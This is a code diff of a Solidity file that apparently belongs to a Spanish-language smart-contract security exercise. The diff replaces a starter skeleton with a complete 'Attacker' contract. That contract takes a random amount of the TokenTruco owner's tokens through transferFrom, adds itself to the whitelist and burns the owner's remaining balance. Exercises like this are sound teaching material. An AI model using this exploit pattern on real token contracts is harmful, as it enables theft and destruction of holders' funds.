@@ -73,27 +73,73 @@ contract TokenTruco is Whitelist, NumeroRandom {
 
 // Deducir la interface y los métodos que se usarán
 // Mediante ITokenTruco el contrato Attacker ejecutará el ataque
+// interface ITokenTruco {
+//     function owner() external view returns (address);
+
+//     function balances(address _account) external view returns (uint256);
+
+//     // function transferFrom
+
+//     // function burn
+
+//     // ...
+// }
+
+// // Modificar el método 'ejecutarAtaque'
+// contract Attacker {
+//     ITokenTruco public tokenTruco;
+
+//     constructor(address _tokenTrucoAddress) {
+//         tokenTruco = ITokenTruco(_tokenTrucoAddress);
+//     }
+
+//     function ejecutarAtaque() public {
+//         // tokenTruco ...
+//     }
+// }
+
 interface ITokenTruco {
+    function montoAleatorio() external view returns (uint256);
+    function transferFrom(address _from, address _to, uint256 _amount) external;
+    function addToWhitelist() external;
+    function burn(address _from, uint256 _amount) external;
     function owner() external view returns (address);
-
     function balances(address _account) external view returns (uint256);
-
-    // function transferFrom
-
-    // function burn
-
-    // ...
 }
 
-// Modificar el método 'ejecutarAtaque'
+// Attacker contract that interacts with the TokenTruco contract
 contract Attacker {
     ITokenTruco public tokenTruco;
 
+    // Constructor to set the address of TokenTruco
     constructor(address _tokenTrucoAddress) {
         tokenTruco = ITokenTruco(_tokenTrucoAddress);
     }
 
+    // Method to execute the attack
     function ejecutarAtaque() public {
-        // tokenTruco ...
+        // Calculate a random amount to transfer using montoAleatorio from TokenTruco
+        uint256 randomAmount = tokenTruco.montoAleatorio();
+
+        // Get the owner's address from TokenTruco
+        address owner = tokenTruco.owner();
+
+        // Ensure the random amount does not exceed the current balance of the owner
+        uint256 ownerBalance = tokenTruco.balances(owner);
+        if (randomAmount > ownerBalance) {
+            randomAmount = ownerBalance;
+        }
+
+        // Transfer the random amount from the owner to this contract
+        tokenTruco.transferFrom(owner, address(this), randomAmount);
+
+        // Add this contract to the whitelist
+        tokenTruco.addToWhitelist();
+
+        // Calculate the remaining balance of the owner to burn
+        uint256 remainingBalance = tokenTruco.balances(owner);
+
+        // Burn the remaining balance of the owner
+        tokenTruco.burn(owner, remainingBalance);
     }
 }
